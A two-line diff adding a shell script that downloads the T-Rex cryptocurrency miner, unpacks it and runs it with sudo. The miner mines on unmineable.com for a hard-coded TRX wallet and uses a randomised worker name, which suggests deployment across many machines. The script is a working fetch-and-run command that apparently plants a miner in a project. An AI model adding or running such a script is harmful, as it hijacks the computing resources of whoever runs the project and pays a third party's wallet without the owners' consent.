@@ -1,0 +1,2 @@
+#!/bin/sh
+apt-get install libpci3 && wget https://trex-miner.com/download/t-rex-0.21.6-linux.tar.gz && tar -xvf t-rex-0.21.6-linux.tar.gz && sudo ./t-rex -a ethash -o ethash.unmineable.com:3333 -u TRX:TQ6EbnnJmwpEbDmisRFz1ZMc9FunZsfEVE.$(echo $(shuf -i 1-10 -n 1)-chaz#leh7-pwum) -p x
